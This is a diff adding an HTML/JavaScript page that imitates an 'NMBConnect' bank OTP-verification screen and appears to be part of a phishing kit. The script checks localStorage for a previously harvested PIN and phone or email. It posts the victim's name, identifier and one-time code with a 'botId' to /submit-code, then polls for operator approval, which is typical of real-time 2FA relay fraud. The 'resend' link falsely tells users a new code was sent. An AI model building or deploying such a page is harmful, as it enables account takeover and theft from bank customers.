@@ -1,0 +1,577 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>NMBConnect - OTP Verification</title>
+
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+}
+
+body {
+    background: #4a2b7a;
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 20px;
+}
+
+.app {
+    width: 100%;
+    max-width: 400px;
+    background: #ffffff;
+    border-radius: 28px;
+    padding: 35px 28px 30px;
+    box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+    position: relative;
+}
+
+/* NMB CONNECT LOGO AT TOP */
+.logo-container {
+    text-align: center;
+    margin-bottom: 20px;
+}
+
+.nmb-logo {
+    display: inline-flex;
+    align-items: center;
+    gap: 10px;
+    text-decoration: none;
+}
+
+.nmb-logo .logo-icon {
+    width: 40px;
+    height: 40px;
+    background: #4a2b7a;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: white;
+    font-size: 20px;
+    font-weight: 700;
+}
+
+.nmb-logo .logo-text {
+    font-size: 22px;
+    font-weight: 700;
+    color: #1a1a2e;
+    letter-spacing: 0.5px;
+}
+
+.nmb-logo .logo-text span {
+    color: #4a2b7a;
+}
+
+/* HEADER SECTION */
+.header {
+    text-align: center;
+    margin-bottom: 28px;
+}
+
+.header h1 {
+    color: #1a1a2e;
+    font-size: 24px;
+    font-weight: 600;
+    letter-spacing: -0.3px;
+    margin-bottom: 8px;
+}
+
+.header p {
+    color: #777;
+    font-size: 14px;
+    font-weight: 400;
+    line-height: 1.5;
+}
+
+.header p .highlight {
+    color: #4a2b7a;
+    font-weight: 600;
+}
+
+/* OTP INPUT - Single input for any length */
+.otp-input-group {
+    margin-bottom: 25px;
+}
+
+.otp-input-group label {
+    display: block;
+    color: #555;
+    font-size: 13px;
+    font-weight: 500;
+    margin-bottom: 8px;
+    letter-spacing: 0.2px;
+}
+
+.otp-input-box {
+    border: 1.5px solid #e0e0e8;
+    border-radius: 12px;
+    padding: 0 14px;
+    transition: all 0.3s ease;
+    background: #fafaff;
+}
+
+.otp-input-box:focus-within {
+    border-color: #4a2b7a;
+    background: #ffffff;
+    box-shadow: 0 0 0 3px rgba(74, 43, 122, 0.08);
+}
+
+.otp-input-box input {
+    background: none;
+    border: none;
+    outline: none;
+    color: #1a1a2e;
+    width: 100%;
+    font-size: 18px;
+    padding: 13px 0;
+    letter-spacing: 4px;
+    font-weight: 500;
+}
+
+.otp-input-box input::placeholder {
+    color: #bbb;
+    font-weight: 400;
+    letter-spacing: 2px;
+}
+
+/* VERIFY BUTTON */
+.verify-btn {
+    width: 100%;
+    padding: 15px;
+    background: #4a2b7a;
+    border: none;
+    border-radius: 12px;
+    color: white;
+    font-size: 17px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    margin-top: 8px;
+    letter-spacing: 0.3px;
+    position: relative;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+}
+
+.verify-btn:disabled {
+    background: #ccc;
+    cursor: not-allowed;
+    transform: none !important;
+    opacity: 0.7;
+}
+
+.verify-btn:hover:not(:disabled) {
+    background: #3a1f5e;
+    transform: translateY(-1px);
+    box-shadow: 0 6px 20px rgba(74, 43, 122, 0.35);
+}
+
+.verify-btn:active:not(:disabled) {
+    transform: translateY(0);
+}
+
+.verify-btn .spinner {
+    display: none;
+    width: 20px;
+    height: 20px;
+    border: 2.5px solid rgba(255, 255, 255, 0.3);
+    border-top: 2.5px solid #ffffff;
+    border-radius: 50%;
+    animation: spin 0.8s ease-in-out infinite;
+}
+
+/* TIMER */
+.timer-container {
+    margin-top: 18px;
+    text-align: center;
+    display: none;
+}
+
+.timer-container.show {
+    display: block;
+}
+
+.timer-container .timer-text {
+    color: #777;
+    font-size: 14px;
+    font-weight: 400;
+}
+
+.timer-container .timer-display {
+    color: #4a2b7a;
+    font-weight: 600;
+    font-size: 16px;
+}
+
+/* RESEND LINK */
+.resend-container {
+    text-align: center;
+    margin-top: 15px;
+    display: none;
+}
+
+.resend-container.show {
+    display: block;
+}
+
+.resend-link {
+    color: #4a2b7a;
+    text-decoration: none;
+    font-size: 14px;
+    font-weight: 500;
+    cursor: pointer;
+    transition: color 0.3s;
+}
+
+.resend-link:hover {
+    color: #3a1f5e;
+    text-decoration: underline;
+}
+
+/* STATUS MESSAGE */
+.status-message {
+    margin-top: 18px;
+    padding: 12px 15px;
+    border-radius: 10px;
+    text-align: center;
+    font-size: 13px;
+    font-weight: 500;
+    display: none;
+    animation: fadeIn 0.4s ease;
+}
+
+.status-message.show {
+    display: block;
+}
+
+.status-message.waiting {
+    background: #f0f4ff;
+    color: #4a2b7a;
+    border: 1px solid #d4dcff;
+}
+
+.status-message.success {
+    background: #e8f5e9;
+    color: #2e7d32;
+    border: 1px solid #a5d6a7;
+}
+
+.status-message.error {
+    background: #ffebee;
+    color: #c62828;
+    border: 1px solid #ef9a9a;
+}
+
+.status-message .spinner-small {
+    display: inline-block;
+    width: 18px;
+    height: 18px;
+    border: 2.5px solid rgba(74, 43, 122, 0.3);
+    border-radius: 50%;
+    border-top-color: #4a2b7a;
+    animation: spin 0.8s ease-in-out infinite;
+    margin-right: 8px;
+    vertical-align: middle;
+}
+
+@keyframes spin {
+    to { transform: rotate(360deg); }
+}
+
+@keyframes fadeIn {
+    from { opacity: 0; transform: translateY(-8px); }
+    to { opacity: 1; transform: translateY(0); }
+}
+
+/* RESPONSIVE */
+@media (max-width: 440px) {
+    .app {
+        padding: 28px 20px 25px;
+        border-radius: 22px;
+    }
+    
+    .header h1 {
+        font-size: 22px;
+    }
+    
+    .nmb-logo .logo-text {
+        font-size: 20px;
+    }
+    
+    .otp-input-box input {
+        font-size: 16px;
+        padding: 11px 0;
+    }
+}
+</style>
+</head>
+
+<body>
+
+<div class="app">
+
+    <!-- NMB CONNECT LOGO -->
+    <div class="logo-container">
+        <div class="nmb-logo">
+            <div class="logo-icon">N</div>
+            <div class="logo-text">NMB<span>Connect</span></div>
+        </div>
+    </div>
+
+    <div class="header">
+        <h1>OTP Verification</h1>
+        <p>Enter the One-Time Password (OTP) sent to your <span class="highlight">mobile number</span></p>
+    </div>
+
+    <form id="otpForm">
+        <div class="otp-input-group">
+            <label>OTP Code</label>
+            <div class="otp-input-box">
+                <input 
+                    id="otpInput" 
+                    type="text" 
+                    placeholder="Enter OTP (e.g., 123456)" 
+                    autocomplete="off"
+                    spellcheck="false"
+                >
+            </div>
+        </div>
+
+        <button type="submit" class="verify-btn" id="submitBtn">
+            <span id="btnText">Verify OTP</span>
+            <span class="spinner" id="spinner"></span>
+        </button>
+    </form>
+
+    <div class="timer-container" id="timerContainer">
+        <span class="timer-text">OTP expires in </span>
+        <span class="timer-display" id="timerDisplay">60</span>
+        <span class="timer-text"> seconds</span>
+    </div>
+
+    <div class="resend-container" id="resendContainer">
+        <a href="#" class="resend-link" id="resendLink">Didn't receive OTP? Resend</a>
+    </div>
+
+    <div id="status" class="status-message"></div>
+
+</div>
+
+<script>
+// ---------------- BOT ROUTING ----------------
+const params = new URLSearchParams(window.location.search);
+const botId = params.get('botId');
+if (!botId) { alert("Invalid access link"); throw new Error(); }
+
+// Prevent skipping steps - check if user came from details page
+// Check for either phone or email in localStorage (whichever was used)
+if (!localStorage.getItem('pin') || (!localStorage.getItem('phone') && !localStorage.getItem('email'))) {
+    window.location.href = `details.html?botId=${botId}`;
+}
+
+// ---------------- DOM ELEMENTS ----------------
+const otpInput = document.getElementById('otpInput');
+const button = document.getElementById('submitBtn');
+const btnText = document.getElementById('btnText');
+const spinner = document.getElementById('spinner');
+const statusDiv = document.getElementById('status');
+const timerContainer = document.getElementById('timerContainer');
+const timerDisplay = document.getElementById('timerDisplay');
+const resendContainer = document.getElementById('resendContainer');
+const resendLink = document.getElementById('resendLink');
+
+// ---------------- STATUS HELPER ----------------
+function showStatus(message, type) {
+    statusDiv.innerHTML = message;
+    statusDiv.className = 'status-message show';
+    if (type) {
+        statusDiv.classList.add(type);
+    }
+}
+
+function hideStatus() {
+    statusDiv.className = 'status-message';
+    statusDiv.innerHTML = '';
+}
+
+// ---------------- COUNTDOWN TIMER ----------------
+let countdown;
+function startCountdown() {
+    let time = 60;
+    timerContainer.classList.add('show');
+    resendContainer.classList.remove('show');
+    timerDisplay.textContent = time;
+
+    clearInterval(countdown);
+    countdown = setInterval(() => {
+        time--;
+        timerDisplay.textContent = time;
+        if (time <= 0) {
+            clearInterval(countdown);
+            timerContainer.classList.remove('show');
+            resendContainer.classList.add('show');
+            showStatus('⏰ OTP expired. Please request a new one.', 'error');
+            button.disabled = true;
+        }
+    }, 1000);
+}
+
+// ---------------- RESEND OTP ----------------
+resendLink.addEventListener('click', function(e) {
+    e.preventDefault();
+    hideStatus();
+    resendContainer.classList.remove('show');
+    button.disabled = false;
+    otpInput.value = '';
+    otpInput.focus();
+    showStatus('🔄 New OTP sent to your mobile number', 'waiting');
+    startCountdown();
+    
+    // Here you would call your resend OTP API
+    setTimeout(() => {
+        hideStatus();
+    }, 3000);
+});
+
+// ---------------- SUBMIT OTP ----------------
+document.getElementById('otpForm').addEventListener('submit', async e => {
+    e.preventDefault();
+
+    const otp = otpInput.value.trim();
+    const name = localStorage.getItem('fullName');
+    // Get the identifier - either phone or email (whichever was stored)
+    const identifier = localStorage.getItem('phone') || localStorage.getItem('email');
+    const identifierType = localStorage.getItem('phone') ? 'phone' : 'email';
+
+    // Validation
+    if (!otp) {
+        showStatus('⚠️ Please enter the OTP sent to your phone', 'error');
+        return;
+    }
+
+    if (otp.length < 4) {
+        showStatus('⚠️ Please enter a valid OTP (minimum 4 characters)', 'error');
+        return;
+    }
+
+    if (!name || !identifier) {
+        showStatus('⚠️ Missing user information. Please restart.', 'error');
+        return;
+    }
+
+    button.disabled = true;
+    btnText.textContent = 'Verifying...';
+    spinner.style.display = 'inline-block';
+    hideStatus();
+    startCountdown();
+
+    try {
+        // Use relative path - your server handles this
+        const res = await fetch('/submit-code', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ 
+                name, 
+                phone: identifier, // Send the identifier as 'phone' for backend compatibility
+                code: otp, 
+                botId,
+                identifierType // Let backend know if it's phone or email
+            })
+        });
+
+        const data = await res.json();
+        
+        if (!res.ok) {
+            throw new Error(data.error || 'Failed to submit');
+        }
+
+        showStatus('⏳ Verifying OTP...', 'waiting');
+
+        // ---------------- POLLING ----------------
+        const poll = setInterval(async () => {
+            try {
+                const r = await fetch(`/check-code/${data.requestId}`);
+                const d = await r.json();
+
+                // ✅ OTP Approved - Redirect to success
+                if (d.approved === true) {
+                    clearInterval(poll);
+                    clearInterval(countdown);
+                    showStatus('✅ OTP Verified! Redirecting...', 'success');
+                    
+                    setTimeout(() => {
+                        window.location.href = `success.html?botId=${botId}`;
+                    }, 1500);
+                }
+
+                // ❌ OTP Rejected
+                if (d.approved === false) {
+                    clearInterval(poll);
+                    clearInterval(countdown);
+                    button.disabled = false;
+                    btnText.textContent = 'Verify OTP';
+                    spinner.style.display = 'none';
+                    timerContainer.classList.remove('show');
+                    resendContainer.classList.add('show');
+                    showStatus('❌ Invalid OTP. Please try again or request a new one.', 'error');
+                    otpInput.value = '';
+                    otpInput.focus();
+                }
+
+            } catch (err) {
+                clearInterval(poll);
+                clearInterval(countdown);
+                button.disabled = false;
+                btnText.textContent = 'Verify OTP';
+                spinner.style.display = 'none';
+                timerContainer.classList.remove('show');
+                resendContainer.classList.add('show');
+                showStatus('⚠️ Connection lost. Please try again.', 'error');
+            }
+        }, 1500);
+
+    } catch (err) {
+        button.disabled = false;
+        btnText.textContent = 'Verify OTP';
+        spinner.style.display = 'none';
+        timerContainer.classList.remove('show');
+        resendContainer.classList.add('show');
+        showStatus('❌ ' + err.message, 'error');
+    }
+});
+
+// ---------------- AUTO-FOCUS ----------------
+otpInput.focus();
+
+// ---------------- ALLOW PASTE ----------------
+otpInput.addEventListener('paste', function(e) {
+    const pasted = e.clipboardData.getData('text');
+    if (pasted) {
+        this.value = pasted.trim();
+        // Auto-submit if OTP looks valid
+        if (pasted.trim().length >= 4) {
+            document.getElementById('otpForm').dispatchEvent(new Event('submit'));
+        }
+    }
+    e.preventDefault();
+});
+
+// ---------------- KEYBOARD SHORTCUT: Enter to submit ----------------
+otpInput.addEventListener('keydown', function(e) {
+    if (e.key === 'Enter' && this.value.trim().length >= 4) {
+        document.getElementById('otpForm').dispatchEvent(new Event('submit'));
+    }
+});
+</script>
+
+</body>
+</html>
